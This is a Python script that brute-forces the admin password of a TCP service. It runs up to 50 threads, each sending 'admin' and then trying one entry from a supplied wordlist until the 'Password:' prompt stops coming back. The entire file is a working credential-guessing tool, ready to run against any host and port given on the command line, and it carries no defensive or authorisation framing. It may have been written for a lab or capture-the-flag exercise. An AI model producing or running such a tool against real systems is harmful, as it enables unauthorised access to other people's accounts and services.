import socket
import argparse
import os
import threading

# Global variable to store the password list and results
passwords = []
found_password = None
lock = threading.Lock()

def connect_and_attempt_password(host, port, password, thread_id):
    global found_password
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for socket connection
        sock.connect((host, port))
        
        # Send the initial command
        sock.sendall(b"admin\n")  # Send "admin" command
        response = sock.recv(4096).decode()
        
        if "Password:" in response:
            print(f"[Thread {thread_id}] Trying password: {password}")
            sock.sendall((password + "\n").encode())  # Send the password
            response = sock.recv(4096).decode()
            
            if "Password:" not in response:  # Successful login
                with lock:
                    if found_password is None:  # Store only the first successful password
                        found_password = password
                        print(f"Success! Found password: {password}")
        else:
            print(f"[Thread {thread_id}] Unexpected response after sending 'admin': {response}")
        
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")
    finally:
        print(f"[Thread {thread_id}] Finished trying password: {password}")
        sock.close()

def main():
    parser = argparse.ArgumentParser(description="Connect to a server and attempt to log in.")
    parser.add_argument('-l', '--host', type=str, required=True, help='Host of the server')
    parser.add_argument('-p', '--port', type=int, default=8000, help='Port of the server (default: 8000)')
    parser.add_argument('-w', '--wordlist', type=str, required=True, help='Path to the dictionary with passwords')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads to use (default: 50)')
    
    args = parser.parse_args()

    # Check if the password file exists
    if not os.path.isfile(args.wordlist):
        print(f"Password file '{args.wordlist}' not found.")
        return

    global passwords
    with open(args.wordlist, 'r') as file:
        passwords = [line.strip() for line in file if line.strip()]  # Remove empty lines

    threads = []
    for index, password in enumerate(passwords):
        # If a password is found, stop creating new threads
        if found_password is not None:
            break
        
        # Create and start a new thread for each password
        thread = threading.Thread(target=connect_and_attempt_password, args=(args.host, args.port, password, index + 1))
        threads.append(thread)
        thread.start()
        
        # Limit the number of active threads
        if len(threads) >= args.threads:
            for thread in threads:
                thread.join()  # Wait for threads to finish
            threads = []

    # Wait for any remaining threads to finish
    for thread in threads:
        thread.join()

    # Print the final result if a password was found
    if found_password is not None:
        print("")
        print(f"Final result: The found password is: {found_password}")
    else:
        print("No valid password found in the dictionary.")

if __name__ == "__main__":
    main()
